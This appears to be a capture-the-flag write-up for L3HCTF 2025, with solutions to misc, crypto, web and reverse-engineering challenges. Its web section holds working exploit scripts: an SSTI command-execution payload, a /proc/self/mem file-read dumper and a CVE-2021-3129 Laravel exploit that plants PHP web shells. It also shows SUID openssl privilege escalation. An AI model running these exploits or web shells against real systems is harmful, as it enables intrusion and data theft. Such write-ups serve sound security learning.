@@ -1,0 +1,1251 @@
+---
+title: L3HCTF2025
+date: 2025-07-14
+---
+
+![img](./img01.png)
+
+# 目录
+
+# Misc
+
+## 量子双生影
+
+扫
+
+![img](./img02.png)
+
+```plaintext
+flag is not here, but I can give you the key: "quantum"
+```
+
+010 打开发现不止一个图片文件
+
+使用 7z-gui 打开发现有两个文件，
+
+![img](./img03.png)
+
+正常解压无法提取出另一个文件
+
+在 7z-gui 直接双击打开图片调出 Windows 自带的 图片浏览器，复制到本地，成功提取出文件
+
+![img](./img04.png)
+
+扫不出来，按颜色异或
+
+```python
+from PIL import Image
+import numpy as np
+
+def xor_images(image1_path, image2_path, output_path):
+    # 打开图片并转换为 RGB 模式, 不要异或 A 通道
+    img1 = Image.open(image1_path).convert("RGB")
+    img2 = Image.open(image2_path).convert("RGB")
+
+    assert img1.size != img2.size
+
+    arr1 = np.array(img1)
+    arr2 = np.array(img2)
+
+    xor_result = np.bitwise_xor(arr1, arr2)
+
+    result_img = Image.fromarray(xor_result, "RGB")
+    result_img.save(output_path)
+
+    print(f"XOR 结果已保存至: {output_path}")
+
+if __name__ == "__main__":
+    xor_images(R"stream2.webp", R"stream2.webp_stream1.webp", R"output.png")
+```
+
+得到异或图，明显是另一个二维码，扫描得答案
+
+## learnRAG
+
+有请大 G 老师
+
+![img](./img05.png)
+
+```python
+# 根据实际数据结构定义RagData类
+class RagData:
+    def __init__(self, embedding_model=None, embeddings=None):
+        self.embedding_model = embedding_model  # 嵌入模型名称
+        self.embeddings = embeddings or []      # 嵌入向量列表
+
+    def __repr__(self):
+        return f"RagData(model='{self.embedding_model}', docs={len(self.embeddings)})"
+
+    def __len__(self):
+        return len(self.embeddings)
+
+    def add_embedding(self, embedding):
+        """添加嵌入向量"""
+        self.embeddings.append(embedding)
+
+    def get_embedding(self, index):
+        """获取指定索引的嵌入向量"""
+        if 0 <= index < len(self.embeddings):
+            return self.embeddings[index]
+        return None
+```
+
+vec2text:https://github.com/vec2text/vec2text
+
+```python
+import torch
+import vec2text
+import pickle
+
+import os
+
+class RagData:
+    def __init__(self, embedding_model=None, embeddings=None):
+        self.embedding_model = embedding_model  # 嵌入模型名称
+        self.embeddings = embeddings or []      # 嵌入向量列表
+
+    def __repr__(self):
+        return f"RagData(model='{self.embedding_model}', docs={len(self.embeddings)})"
+
+    def __len__(self):
+        return len(self.embeddings)
+
+    def add_embedding(self, embedding):
+        """添加嵌入向量"""
+        self.embeddings.append(embedding)
+
+    def get_embedding(self, index):
+        """获取指定索引的嵌入向量"""
+        if 0 <= index < len(self.embeddings):
+            return self.embeddings[index]
+        return None
+
+with open("rag_data.pkl", "rb") as f:
+    data = pickle.load(f)
+
+embeddings = torch.tensor(data.embeddings)
+
+print(embeddings.shape)
+corrector = vec2text.load_pretrained_corrector("gtr-base")
+
+print("开始嵌入反转...")
+a = vec2text.invert_embeddings(
+    embeddings=embeddings,
+    corrector=corrector
+)
+print(a)
+```
+
+![img](./img06.png)
+
+可以得到向量的大致原始文本，但恢复的不完全正确，通过文本描述，整理出 L3HCTF?WOWT?hI?SISEMBEDDING?，可能是模型选择和轮次的问题？长度为 26，结合语义猜测是 L3HCTF{WOWThISISEMBEDDING}，提交错误，全大写提交错误，首字母大写提交错误，全小写正确。
+
+## Please Sign In
+
+大 G 老师秒杀
+
+```python
+import torch
+import json
+from torchvision import transforms
+from torchvision.models import shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights
+from PIL import Image
+import torch.optim as optim
+
+# 1. 加载与服务器相同的模型
+feature_extractor = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)
+feature_extractor.fc = torch.nn.Identity()
+feature_extractor.eval()
+
+# 2. 加载目标 embedding
+try:
+    with open("embedding.json", "r") as f:
+        target_embedding_list = json.load(f)
+    target_embedding = torch.tensor(target_embedding_list, dtype=torch.float32).unsqueeze(0)
+except FileNotFoundError:
+    print("错误: embedding.json 未找到。请先运行 server.py 生成该文件。")
+    exit()
+
+# 3. 初始化一个随机图像
+# ShuffleNetV2 通常使用 224x224 的输入尺寸
+# 我们创建一个需要计算梯度的随机张量
+generated_image = torch.randn(1, 3, 224, 224, requires_grad=True)
+
+# 4. 设置优化器
+# 使用 Adam 优化器来更新图像的像素值
+optimizer = optim.Adam([generated_image], lr=0.01)
+loss_fn = torch.nn.MSELoss()
+
+print("开始通过优化生成图片...")
+for i in range(1000): # 迭代1000次，可以根据需要调整
+    # 清零梯度
+    optimizer.zero_grad()
+
+    # 前向传播，获取当前生成图片的 embedding
+    current_embedding = feature_extractor(generated_image)
+
+    # 计算损失 (与目标 embedding 的差距)
+    loss = loss_fn(current_embedding, target_embedding)
+
+    # 反向传播，计算梯度
+    loss.backward()
+
+    # 更新图片
+    optimizer.step()
+
+    # 限制像素值在有效范围 [0, 1]
+    with torch.no_grad():
+        generated_image.clamp_(0, 1)
+
+    if (i + 1) % 100 == 0:
+        print(f"迭代次数: {i+1}, 当前损失 (MSE): {loss.item():.10f}")
+
+    # 检查损失是否足够小，如果满足条件则提前退出
+    if loss.item() < 1e-7: # 设置一个比服务器阈值更小的目标
+        print(f"损失已足够小，在第 {i+1} 次迭代后停止。")
+        break
+
+print("优化完成！")
+
+# 5. 保存生成的图片
+# 将张量 [0, 1] 转换为 PIL Image [0, 255]
+final_image_tensor = generated_image.squeeze(0).detach()
+to_pil = transforms.ToPILImage()
+reconstructed_pil_image = to_pil(final_image_tensor)
+
+# 保存为 png 文件
+output_filename = "reconstructed_image.png"
+reconstructed_pil_image.save(output_filename)
+
+print(f"成功将构造的图片保存为 {output_filename}")
+
+# (可选) 验证生成的图片
+print("正在验证生成的图片...")
+submit_image = Image.open(output_filename).convert("RGB")
+transform_to_tensor = transforms.ToTensor()
+submit_tensor = transform_to_tensor(submit_image).unsqueeze(0)
+
+with torch.no_grad():
+    submit_embedding = feature_extractor(submit_tensor)
+
+diff = torch.mean((target_embedding - submit_embedding) ** 2)
+print(f"验证完成。构造图片的特征与目标特征的均方误差为: {diff.item():.10f}")
+if diff.item() < 5e-6:
+    print("验证成功！该图片可以通过服务器认证。")
+else:
+    print("验证失败。需要调整优化参数或增加迭代次数。")
+import requests
+import os
+
+# 目标 URL
+# url = "http://1.95.8.146:50001/signin/"
+# 要发送的文件名
+file_path = "reconstructed_image.png"
+
+# 检查文件是否存在
+if not os.path.exists(file_path):
+    print(f"错误: 文件 '{file_path}' 未找到。")
+    print("请先运行 reconstruct_image.py 来生成该文件。")
+else:
+    try:
+        # 以二进制读取模式打开文件
+        with open(file_path, 'rb') as f:
+            # 'file' 是 FastAPI 后端期望的字段名
+            files = {'file': (file_path, f, 'image/png')}
+
+            print(f"正在将 '{file_path}' 发送到 {url} ...")
+
+            # 发送 POST 请求
+            response = requests.post(url, files=files)
+
+            # 检查响应状态码
+            response.raise_for_status()  # 如果状态码不是 2xx，则会引发 HTTPError
+
+            # 打印服务器返回的 JSON 结果
+            print("请求成功！")
+            print("服务器响应:")
+            print(response.json())
+
+    except requests.exceptions.RequestException as e:
+        print(f"请求失败: {e}")
+    except Exception as e:
+        print(f"发生了一个错误: {e}")
+```
+
+## Why not read it out?
+
+https://github.com/AncientAbysswalker/RuinSeeker?tab=readme-ov-file
+
+有些画图的网站：https://mitchellwarr.github.io/tunic-writer/
+
+结合题目描述来看，要通过这个语言的发音，恢复出原本英文
+
+通过标点符号对应到原始文本为：https://www.ign.com/articles/tunic-review-xbox-pc-steam，010里打开图片末尾有b64的提示：ign review
+
+![img](./img07.png)
+
+![img](./img08.jpeg)
+
+发现题目和现有工具对应不上，猜测是建立了新的规则，查看这种语言的原理，外层代表元音，内层代表辅音，由于已经找到题目对应的原文，单词一一对应后，可以打表获得所有音标对应的符号。
+
+对 1-5 的未知内容进行内外层拆分，在上面两段原文中找到一样的结构（查表），恢复出音标，从而恢复出单词。
+
+手搓大致内容如下：
+
+![img](./img09.jpeg)
+
+大致内容为
+
+1.flag is: come on little brave fox
+
+2.replace letter o with number zero, letter l with number one
+
+3.replace letter a with symbol @
+
+4.make e upper(?不太确定单词，猜了一下大写)
+
+5.use underline......
+
+替换一些字母，最后用下划线连接，最终 flag：L3HCTF{c0mE_0n_1itt1E_br@vE_f0x}
+
+## PaperBack
+
+读图 http://www.ollydbg.de/Paperbak/
+
+执行 https://www.w3cschool.cn/tryrun/runcode?lang=whitespace
+
+# Crypto
+
+## EzECDSA
+
+grobner 基
+
+```python
+from Crypto.Util.number import *
+H = [
+    5832921593739954772384341732387581797486339670895875430934592373351528180781,
+    85517239535736342992982496475440962888226294744294285419613128065975843025446,
+    90905761421138489726836357279787648991884324454425734512085180879013704399530,
+    103266614372002123398101167242562044737358751274736728792365384600377408313142,
+    9903460667647154866199928325987868915846235162578615698288214703794150057571,
+    54539896686295066164943194401294833445622227965487949234393615233511802974126
+]
+
+R1 = [
+    78576287416983546819312440403592484606132915965726128924031253623117138586396,
+    60425040031360920373082268221766168683222476464343035165195057634060216692194,
+    75779605492148881737630918749717271960050893072832415117470852442721700807111,
+    89519601474973769723244654516140957004170211982048028366151899055366457476708,
+    17829304522948160053211214227664982869100868125268116260967204562276608388692,
+    66428683990399093855578572760918582937085121375887639383221629490465838706027
+]
+
+S = [
+    108582979377193966287732302562639670357586761346333866965382465209612237330851,
+    27924509924269609509672965613674355269361001011362007412205784446375567959036,
+    72740499400319841565890543635298470075267336863033867770902108413176557795256,
+    23639647021855356876198750083669161995553646511611903128486429649329358343588,
+    74400189461172040580877095515356365992183768921088660926738652857846750009205,
+    25418035697368269779911580792368595733749376383350120613502399678197333473802
+]
+q=115792089210356248762697446949407573529996955224135760342422259061068512044369
+PR.<k,a,b,c> = PolynomialRing(GF(q))
+G=[]
+for i in range(5):
+    f=H[i]*R1[i+1]-H[i+1]*R1[i]-S[i]*R1[1+i]*k+S[1+i]*R1[i]*(a*k**2+b*k+c)
+    k=a*k**2+b*k+c
+    G.append(f)
+B = Ideal(G).groebner_basis()
+print(B)
+k=q-20259192668456929166524619606713276345602588639715480059091270804733464402770
+d=((S[0]*k-H[0])*inverse(R1[0],q)) %q
+print(d)
+```
+
+## math_problem
+
+flag 没 pad，单素数直接解 rsa
+
+```python
+from gmpy2 import *
+from Crypto.Util.number import *
+from random import randint
+from gmpy2 import invert
+n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921
+c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984
+hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333
+hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907
+r=GCD(n,hint1)
+d=inverse(65537,r-1)
+print(long_to_bytes(pow(c,d,r)))
+```
+
+## RRRSSSAAA
+
+连分数展开
+
+```python
+n = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609
+e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827
+c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879
+
+cf = continued_fraction(Integer(e) / Integer(n^4))
+
+for i in range(2,5000):
+    k = int(cf.numerator(i))
+    d = int(cf.denominator(i))
+    if (e*d + 1)%k == 0:
+        print(f"k = {k}")
+        print(f"d = {d}")
+print(k.bit_length())
+
+k = 13170628427221157622080905074788568652799119633284546272595291116183320758728696256019899290052293252519829218819432139942547554233133894542579473121902470617621972955393564981812918152484427267181708966917748904656339496382975639286555856687704261208583799961345860942328409070071296732611793771096376293174
+d = 17372639913107741501146208772187139146852260610883839618855923950545197134424607029396252998050515899949643094115623673649273018581931666923303533501468962283467588122385796988242689781369487324470894248867945328660968094653971094556726274784436934821042779083118528017011113329644650810796970956252588395837
+
+from Crypto.Util.number import *
+print(d.bit_length())
+phi=(e*d+1)//k
+dd=inverse(e,phi)
+
+print(long_to_bytes(pow(c,dd,n)))
+```
+
+# Web
+
+## 赛博侦探
+
+http://223.112.5.141:55404/secret/find_my_password
+
+邮箱：leland@l3hsec.com，docx 改 zip 后缀，全局搜一下@，找到邮箱
+
+老家：福州，解码登机牌条形码有航班信息
+
+经纬度：114.169184,30.620042
+
+114.169171,30.61936
+
+GCJ02(高德/腾讯坐标系)114.16912974973593,30.61902788051066 东经 E：114°10′8.87″ 北纬 N：30°37′8.50″BD09(百度坐标系)114.17572334155183,30.624743717864874 东经 E：114°10′32.60″ 北纬 N：30°37′29.08″
+
+WGs84：114.16353904889526,30.621383055909554
+
+在那个宜家里面
+
+![img](./img10.png)
+
+姓名：LELAND 大写
+
+![img](./img11.png)
+
+答题正确后目录穿越读 flag
+
+## best_profile
+
+nginx 的静态缓存配置可以构造后缀为.jpg 的用户名绕过需要权限的 get_last_ip。然后直接 x-forwarded-for 打 ssti 就好
+
+```python
+import requests
+
+# domain="http://127.0.0.1:8180"
+domain="http://61.147.171.103:52654"
+
+def register(username, password):
+    url=f"{domain}/register"
+    data={
+        "username":username,
+        "password":password,
+        "bio":"aaa"
+    }
+    res=requests.post(url,data=data)
+
+def login(username, password):
+    url=f"{domain}/login"
+    data={
+        "username":username,
+        "password":password
+    }
+    res=requests.post(url,data=data,allow_redirects=False)
+    return res.cookies.get_dict()['session']
+
+def test1(name,payload):
+    url=f"{domain}/"
+    session=login(name, "aa")
+    headers={
+        "X-Forwarded-For":payload,
+        "cookie":"session="+session
+    }
+    res=requests.get(url,headers=headers)
+
+def test2(name1,name2):
+    url=f"{domain}/get_last_ip/"+name2
+    session=login(name1, "aa")
+    headers={
+        # "X-Forwarded-For":"asdsadasdsa",
+        "cookie":"session="+session
+    }
+    res=requests.get(url,headers=headers)
+    print(res.text)
+
+def test3(name):
+    url=f"{domain}/ip_detail/"+name
+    params={
+        "a1":"os",
+        "a2":"cat /flag"
+    }
+    res=requests.get(url,params=params)
+    print(res.text)
+
+name1="dd"
+name2="aa.jpg"
+payload="{{url_for.__globals__[request.args.a1].popen(request.args.a2).read()}}"
+register(name1, "aa")
+register(name2, "aa")
+test1(name2,payload)
+test2(name1,name2)
+test3(name2)
+```
+
+## gateway_advance
+
+/static 处有 alias 存在目录穿越读文件，但是只能本地访问，所以需要通过 download 去读取。download 处的 get_uri_args 只能获取最大 100 个请求参数。只要超过 100 个参数就不会检测 filename。读/proc/self/fd/6 可以读到密码，后面的 body 检测设置 Range 头可以通过部分读取绕过。接下来就是读取 maps 文件然后读取 mem 即可。
+
+```python
+import requests
+import re
+
+def make_payload():
+    pp=""
+    for i in range(100):
+        pp+="a"+str(i)+"=0&"
+    return pp+"filename=test"
+# print(make_payload())
+
+def readanyfile(filename,start,length):
+    url="http://43.138.2.216:17794/read_anywhere"
+    headeers={
+        "X-Gateway-Password":"passwordismemeispasswordsoneverwannagiveyouup",
+        "X-Gateway-Filename":filename,
+        "X-Gateway-Start":str(start),
+        "X-Gateway-Length":str(length)
+
+    }
+    res=requests.get(url,headers=headeers)
+    return res.content
+
+maps=readanyfile("/proc/self/maps",0,102400).decode().split("\n")
+pattern = "([0-9a-f]+)-([0-9a-f]+) rw"
+mems=b''
+for line in maps:
+    map_addr = re.match(pattern,line)
+    if map_addr:
+        # print(map_addr.group(1),"-",map_addr.group(2))
+        start = int(map_addr.group(1), 16) #group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的
+        end = int(map_addr.group(2), 16)
+        length=end-start
+        mem=readanyfile("/proc/self/mem",start,length)
+        if b"flag" in mem or b'l3hctf' in mem:
+            # print(mem)
+            mems+=mem
+
+with open("mem.bin","wb")as f:
+    f.write(mems)
+# passwordismemeispasswordsoneverwannagiveyouup
+# L3HCTF{g4t3way_st1ll_n0t_s3cur3}
+```
+
+## gogogo 出发喽
+
+laravel 经典的洞 CVE-2021-3129，file_get_contents phar 反序列化。随便在/upload 上传个 phar 文件，然后触发 phar 反序列化，phpggc 链子一大堆，随便选一个。通过 proc_open 绕过 disable_functions，拿到 shell。
+
+```python
+# -*- coding=utf-8 -*-
+# Author : Crispr
+# Alter: zhzyker
+import os
+import requests
+import sys
+import base64
+from urllib3.exceptions import InsecureRequestWarning
+
+# Suppress only the single warning from urllib3 needed.
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+class EXP:
+
+    __gadget_chains = {
+        "Laravel/RCE5":r"""
+         php74 -d "phar.readonly=0" ./phpggc Laravel/RCE5 "file_put_contents('/var/www/html/public/ccc1.php','<?php eval(getallheaders()[\"Aaa\"]);');" --phar phar -o php://output | base64 -w 0
+        """,
+    }
+
+    def __vul_check(self):
+        res = requests.get(self.__url,verify=False)
+        if res.status_code != 405 and "laravel" not in res.text:
+            print("[+]Vulnerability does not exist")
+            return False
+        return True
+
+    def __payload_send(self,payload):
+        header = {
+            "Accept": "application/json"
+        }
+        data = {
+            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+            "parameters": {
+                "variableName": "cve20213129",
+                "viewFile": ""
+            }
+        }
+        data["parameters"]["viewFile"] = payload
+
+        #print(data)
+        res = requests.post(self.__url, headers=header, json=data, verify=False)
+        return res
+
+
+    def __generate_payload1(self,gadget_chain):
+        generate_exp = self.__gadget_chains[gadget_chain]
+        #print(generate_exp)
+        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")
+        print("[+]exploit:")
+        # print(exp)
+        return exp
+
+
+    def __rce1(self,url):
+        text = str(self.__payload_send("phar://uploads/"+url+"/test.txt").text)
+        # print(text)
+        text = text[text.index(']'):].replace("}","").replace("]","")
+        self.test()
+        return text
+
+    def test(self):
+        url="http://1.95.34.119:41164/ccc1.php"
+        headers={
+            # "Aaa":"var_dump(scandir('/flag_gogogo_chufalong'));"
+            # "Aaa":"var_dump(file_get_contents('/flag_gogogo_chufalong'));"
+            "Aaa":'''var_dump(file_put_contents('/var/www/html/public/ttt.php','<?php $command=$_REQUEST[cmd];$descriptorspec=array(1 => array("pipe", "w"));$handle = proc_open($command ,$descriptorspec , $pipes);while(!feof($pipes[1])){echo fread($pipes[1], 1024);}'));'''
+        }
+        res=requests.get(url,headers=headers)
+        print(res.text)
+
+    def upload_file(self,exp):
+        url="http://1.95.34.119:41164/api/image/base64"
+        data={
+            "data":"data: image/png;base64,"+exp
+        }
+        res=requests.post(url,data=data)
+        url=res.json()['data']['url']
+        return url
+
+    def exp(self):
+        for gadget_chain in self.__gadget_chains.keys():
+            print("[*] Try to use %s for exploitation." % (gadget_chain))
+            exp=self.__generate_payload1(gadget_chain)
+            url=self.upload_file(exp)
+            print("[*] " + gadget_chain + " Result:")
+            print(self.__rce1(url))
+
+    def __init__(self, target):
+        self.target = target
+        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
+        if not self.__vul_check():
+            print("[-] [%s] is seems not vulnerable." % (self.target))
+            print("[*] You can also call obj.exp() to force an attack.")
+        else:
+            self.exp()
+
+def main():
+    EXP(sys.argv[1])
+
+if __name__ == "__main__":
+    main()
+```
+
+接下来就是提权了，搜一下 suid，有一个 openssl，使用/usr/bin/openssl base64 -in /flag_gogogo_chufalong 读取 flag
+
+L3HCTF{csg0g0g0-chu4alou-1ar4v3l-i5-f55ning!}
+
+# RE
+
+## TemporalParadox
+
+```python
+import os
+import time
+import subprocess
+import win32api
+from datetime import datetime
+import ctypes
+import sys
+
+# 检查管理员权限
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    exit(1)
+
+# 配置参数
+START_TIMESTAMP = 1751990400
+END_TIMESTAMP = 1752052051
+STEP = 1
+RUN_DURATION = 0.05
+COMBINED_LOG = "all_output.log"  # 所有输出合并到这个文件
+
+# 完全静默模式
+sys.stdout = open(os.devnull, 'w')
+sys.stderr = open(os.devnull, 'w')
+
+def set_system_time(timestamp):
+    utc_time = datetime.utcfromtimestamp(timestamp)
+    win32api.SetSystemTime(
+        utc_time.year,
+        utc_time.month,
+        utc_time.isoweekday() % 7,
+        utc_time.day,
+        utc_time.hour,
+        utc_time.minute,
+        utc_time.second,
+        utc_time.microsecond // 1000
+    )
+
+def run_tests():
+    original_time = time.time()
+
+    with open(COMBINED_LOG, "a", encoding="utf-8") as log_file:
+        for test_time in range(START_TIMESTAMP, END_TIMESTAMP + 1, STEP):
+            try:
+                # 设置系统时间
+                set_system_time(test_time)
+
+                # 启动程序并捕获输出
+                proc = subprocess.Popen(
+                    ["main.exe"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True,
+                    encoding='utf-8'
+                )
+
+                # 等待指定时间
+                time.sleep(RUN_DURATION)
+
+                # 终止程序并获取输出
+                proc.kill()
+                output, _ = proc.communicate()
+
+                # 写入统一日志文件
+                log_file.write(f"\n=== Timestamp: {test_time} ===\n")
+                log_file.write(output)
+                log_file.flush()
+
+            except Exception:
+                set_system_time(original_time)
+
+    set_system_time(original_time)
+
+if __name__ == "__main__":
+    run_tests()
+```
+
+## 终焉之门
+
+```c++
+#include <stdio.h>
+int main(int argc, char const *argv[])
+{
+    unsigned int cyber[16] = {
+    0x000000F3, 0x00000082, 0x00000006, 0x000001FD, 0x00000150, 0x00000038, 0x000000B2, 0x000000DE,
+    0x0000015A, 0x00000197, 0x0000009C, 0x000001D7, 0x0000006E, 0x00000028, 0x00000146, 0x00000097
+};
+unsigned int ans[32] = {
+    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
+    0x000000B0, 0x000000C8, 0x000000FA, 0x00000086, 0x0000006E, 0x0000008F, 0x000000AF, 0x000000BF,
+    0x000000C9, 0x00000064, 0x000000D7, 0x000000C3, 0x000000E3, 0x000000EF, 0x00000087, 0x00000000
+};
+// (x ^ F3)
+     for(int i = 0; i < 16; i++) {
+        cyber[i] = cyber[i] - 20;
+
+    }
+
+        cyber[15] = ans[30] - cyber[15];
+        cyber[14] -= ans[29];
+        cyber[13] = ans[28] - cyber[13];
+        cyber[12] = ans[27] -cyber[12];
+        cyber[11] -= ans[26];
+        cyber[10] -= ans[25];
+        cyber[9] -= ans[24];
+        cyber[8] -= ans[23];
+        cyber[7] -= ans[22];
+        cyber[6] -= ans[21];
+        cyber[5] = ans[20] - cyber[5];
+        cyber[4] -= ans[19];
+        cyber[3] -= ans[18];
+        cyber[2] = ans[17] - cyber[2] ;
+        cyber[1] = ans[16] - cyber[1] ;
+
+     for(int i = 0; i < 16; i++) {
+
+        printf("%x ", cyber[i]);
+    }
+       printf("\n");
+
+        for (int i = 1; i <= 15; i++)
+        {
+            cyber[i] = (cyber[i] ^ cyber[i-1]) ;
+
+        }
+        for(int i = 0; i < 16; i++)
+        {
+            printf("%02x", cyber[i] & 0xFF);
+        }
+
+
+    return 0;
+}
+```
+
+## **easyvm**
+
+魔改 tea 加密 ， 每轮的 sum 延续到下一轮
+
+```c++
+#include <stdio.h>
+#include <stdint.h>
+
+//加密函数
+void encrypt(uint32_t* v, uint32_t* k) {
+        uint32_t v0 = v[0], v1 = v[1], sum = 0xd9a67300, i;
+        uint32_t delta = 0x11223344;//Delta
+        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3] ,x = 0, y = 0xABCDEF01;
+        for (i = 0; i < 64; i++) {
+            v0 += ((v1 << 3) + k0) ^ (v1 + sum + x) ^ ((v1 >> 4) + k1);
+            if (i == 0) {
+                printf("v0 = 0x%x\n", v0);
+            }
+            sum += delta;
+            v1 += ((v0 << 2) + k2) ^ (v0 + sum + y) ^ ((v0 >> 5) + k3);
+        }
+        printf("sum = 0x%x\n", sum);
+
+        v[0] = v0; v[1] = v1;
+}
+
+//解密函数
+void decrypt(uint32_t* v, uint32_t* k) {
+        uint32_t v0 = v[0], v1 = v[1], sum = 0x22334400, i;
+        uint32_t delta = 0x11223344;
+        uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3],x = 0, y = 0xABCDEF01;
+        for (i = 0; i<64; i++) {
+                v1 -= ((v0 << 2) + k2) ^ (v0 + sum + y) ^ ((v0 >> 5) + k3);
+                sum -= delta;
+                v0 -= ((v1 << 3) + k0) ^ (v1 + sum + x) ^ ((v1 >> 4) + k1);
+
+        }
+        v[0] = v0; v[1] = v1;
+}
+
+int main()
+{
+        // v为要加解密的数据，两个32位的数据
+        //0x61616161,0x61616161
+        uint32_t v[2] = {0xC4CFAA9F,0xF1A00CA1 };
+        // k为加解密密钥，4个32位无符号整数，密钥长度为128位
+        uint32_t k[4] = { 0xA56BABCD,0xFFFFFFFF,0xFFFFFFFF,0xA56BABCD };
+        int n = sizeof(v) / sizeof(uint32_t);
+        // printf("加密前原始数据：0x%x 0x%x\n", v[0], v[1]);
+        // encrypt(v, k);
+        printf("加密后的数据：0x%x 0x%x\n", v[0], v[1]);
+        decrypt(v, k);
+        printf("解密后的数据：0x%x 0x%x\n", v[0], v[1]);
+        for (int i = 0; i < n; i++)
+        {
+                for (int j = 0; j < sizeof(uint32_t)/sizeof(uint8_t); j++)
+                {
+                        printf("%c", (v[i] >> (j * 8)) & 0xFF);
+                }
+        }
+        printf("\n");
+        return 0;
+}
+```
+
+## obfuscate
+
+WelcometoL3HCTF! 创建 26 DWORD 密钥流
+
+每轮处理两 DWORD 每轮加密函数循环 13 次,
+
+```python
+def main():
+    # 左循环移位函数
+    def rol(val, r_bits, max_bits=32):
+        r_bits %= max_bits
+        return ((val << r_bits) & (2**max_bits - 1)) | (val >> (max_bits - r_bits))
+
+    # 解密函数
+    def dec(v26, v27, table, round):
+        for i in range(0xc, 0, -1):
+            v26 = v27 ^ v26
+
+            tmp = (v27 - table[2*i+1]) & 0xFFFFFFFF
+            tmp = rol(tmp, 32-v26, 32)
+            v27 = tmp ^ v26
+
+            tmp = (v26 - table[2*i]) & 0xFFFFFFFF
+            tmp = rol(tmp, 32-v27, 32)
+            v26 = v27 ^ tmp
+
+        v27 = (v27 - table[2*round+1]) & 0xFFFFFFFF
+        v26 = (v26 - table[2*round]) & 0xFFFFFFFF
+        return v26, v27
+
+    # 密钥表
+    table = [
+        0x122f2c9c,0xe3bccae7,0xd0ffc0f2,0xd9a12544,0x8a27992f,0x55b1b935,0x9110b161,0x92811564,
+        0x5ce9b359,0x77c79a51,0x4265527a,0x8ab57c4b,0x11529fa4,0x9d9f63ff,0xa970b936,0xc8eaba0d,
+        0x9a0eb4aa,0xb0bc6e7f,0x9784b100,0x70dcd3ae,0x6057a44e,0x89187658,0xe00098a8,0x45773540,
+        0xf9374f1a,0x913fa548
+    ]
+
+    # 密文数据
+    cipher = [
+        0xf2a1bb1b, 0x21877ce9,0x0afd378a, 0xbc811a94,0xaae31e40, 0x3fd82e73,0x4271b884, 0x398b35cc
+    ]
+
+    # 解密并输出
+    for i in range(4):
+        v0, v1 = dec(cipher[2*i], cipher[2*i+1], table, 0)
+        for v in (v0, v1):
+            print(bytes([
+                v & 0xff,
+                (v >> 8) & 0xff,
+                (v >> 16) & 0xff,
+                (v >> 24) & 0xff
+            ]).decode('latin1'), end='')
+
+if __name__ == "__main__":
+    main()
+```
+
+## ez_android
+
+纯纯换皮模板题，pz✌ 各路大佬分享会视频
+
+![img](./img12.png)
+
+拿表，解包，index.html 是空壳，js 只是单纯送给后端的 greet
+
